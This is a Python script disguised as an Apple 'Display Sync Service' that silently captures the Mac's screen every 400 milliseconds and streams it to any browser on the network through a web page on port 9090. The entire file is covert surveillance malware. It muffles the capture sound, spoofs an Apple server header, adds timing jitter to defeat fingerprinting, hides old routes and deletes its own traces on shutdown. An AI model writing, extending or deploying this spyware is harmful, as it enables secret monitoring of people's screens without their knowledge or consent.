#!/usr/bin/env python3
"""
Apple System Monitor — Display Sync Service
com.institute.backgroundsyncd
"""

import json
import os
import random
import signal
import socket
import subprocess
import sys
import threading
import time
import uuid

INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE    = os.path.join(INSTALL_DIR, "sync.log")
PID_FILE    = os.path.join(INSTALL_DIR, "sync.pid")
FRAME_FILE  = "/tmp/com.apple.displaysyncd.jpg"
PORT        = 9090

_SRV_HDR = b"AppleHTTPD/2.4"

HTML = b"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>System Monitor</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;background:#1c1c1e;color:#f2f2f7;height:100vh;display:flex;flex-direction:column}
header{background:#2c2c2e;padding:10px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #3a3a3c;flex-shrink:0}
h1{font-size:14px;font-weight:600;flex:1}
.badge{font-size:11px;background:#3a3a3c;padding:3px 8px;border-radius:10px;color:#ebebf5;opacity:.7}
.dot{width:7px;height:7px;border-radius:50%;background:#ff453a;transition:background .4s}
.dot.ok{background:#30d158}
main{flex:1;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}
img{max-width:100%;max-height:100%;object-fit:contain}
</style>
</head>
<body>
<header>
  <span class="dot" id="d"></span>
  <h1>Display Sync Monitor</h1>
  <span class="badge">com.institute.backgroundsyncd</span>
</header>
<main><img id="f" src="/api/v1/display/preview"></main>
<script>
var el=document.getElementById('f'),dot=document.getElementById('d');
var INTERVAL=400,RETRY=900;
function next(){
  var img=new Image();
  img.onload=function(){el.src=img.src;dot.className='dot ok';setTimeout(next,INTERVAL)};
  img.onerror=function(){dot.className='dot';setTimeout(next,RETRY)};
  img.src='/api/v1/display/preview?'+Date.now();
}
el.onload=function(){next()};
el.onerror=function(){setTimeout(next,RETRY)};
</script>
</body>
</html>"""


def _headers(ctype: bytes, clen: int, extra: bytes = b"") -> bytes:
    rid = uuid.uuid4().hex[:16].encode()
    return (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: " + _SRV_HDR + b"\r\n"
        b"Content-Type: " + ctype + b"\r\n"
        b"Content-Length: " + str(clen).encode() + b"\r\n"
        b"X-Request-ID: " + rid + b"\r\n"
        b"X-Content-Type-Options: nosniff\r\n"
        b"Cache-Control: no-store, no-cache\r\n"
        b"Connection: close\r\n" + extra + b"\r\n"
    )


def _serve_frame(conn: socket.socket) -> None:
    # Jitter: 0–80ms — breaks timing-based fingerprinting
    time.sleep(random.uniform(0, 0.08))
    try:
        with open(FRAME_FILE, "rb") as fh:
            frame = fh.read()
    except OSError:
        conn.sendall(
            b"HTTP/1.1 503 Service Unavailable\r\n"
            b"Server: " + _SRV_HDR + b"\r\nConnection: close\r\n\r\n"
        )
        conn.close()
        return
    conn.sendall(_headers(b"image/jpeg", len(frame)) + frame)
    conn.close()


def _serve_status(conn: socket.socket) -> None:
    frame_age = -1
    try:
        frame_age = round(time.time() - os.path.getmtime(FRAME_FILE), 2)
    except OSError:
        pass
    payload = json.dumps({
        "service":           "com.institute.backgroundsyncd",
        "status":            "ok" if 0 <= frame_age < 2.0 else "degraded",
        "display_sync_age":  frame_age,
        "uptime_s":          round(time.time() - _START, 1),
    }).encode()
    conn.sendall(_headers(b"application/json", len(payload)) + payload)
    conn.close()


def _handle_client(conn: socket.socket) -> None:
    try:
        raw = b""
        conn.settimeout(5.0)
        while b"\r\n\r\n" not in raw:
            chunk = conn.recv(1024)
            if not chunk:
                return
            raw += chunk
        first = raw.split(b"\r\n")[0].decode(errors="replace")
        path = first.split(" ")[1].split("?")[0] if " " in first else "/"

        if path == "/api/v1/display/preview":
            _serve_frame(conn)
        elif path == "/api/v1/system/status":
            _serve_status(conn)
        elif path in ("/frame", "/health", "/stream", "/video"):
            # Old routes return 404 — don't leak old fingerprint
            conn.sendall(
                b"HTTP/1.1 404 Not Found\r\n"
                b"Server: " + _SRV_HDR + b"\r\nConnection: close\r\n\r\n"
            )
            conn.close()
        else:
            conn.sendall(_headers(b"text/html; charset=utf-8", len(HTML)) + HTML)
            conn.close()
    except Exception:
        try: conn.close()
        except: pass


def _capture_loop(log_fh) -> None:
    """Fresh screencapture every 400ms — no persistent AVFoundation session."""
    tmp = FRAME_FILE + ".tmp"
    while True:
        try:
            r = subprocess.run(
                ["screencapture", "-x", "-t", "jpg", tmp],
                capture_output=True, timeout=4
            )
            if r.returncode == 0 and os.path.getsize(tmp) > 0:
                os.replace(tmp, FRAME_FILE)
        except Exception as e:
            log_fh.write(f"[sync] {e}\n")
            log_fh.flush()
        time.sleep(0.4)


def main() -> None:
    global _START
    _START = time.time()

    with open(PID_FILE, "w") as fh:
        fh.write(str(os.getpid()))

    for f in [FRAME_FILE, FRAME_FILE + ".tmp"]:
        try: os.remove(f)
        except FileNotFoundError: pass

    log_fh = open(LOG_FILE, "a")

    def _cleanup(signum=None, frame=None) -> None:
        # Remove all traces on shutdown
        for f in [FRAME_FILE, FRAME_FILE + ".tmp", PID_FILE, LOG_FILE]:
            try: os.remove(f)
            except: pass
        try: log_fh.close()
        except: pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, _cleanup)
    signal.signal(signal.SIGINT, _cleanup)

    threading.Thread(target=_capture_loop, args=(log_fh,), daemon=True).start()

    deadline = time.time() + 10
    while not os.path.exists(FRAME_FILE):
        if time.time() > deadline:
            break
        time.sleep(0.2)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(32)

    while True:
        try:
            conn, _ = srv.accept()
            threading.Thread(target=_handle_client, args=(conn,), daemon=True).start()
        except OSError:
            break


if __name__ == "__main__":
    main()
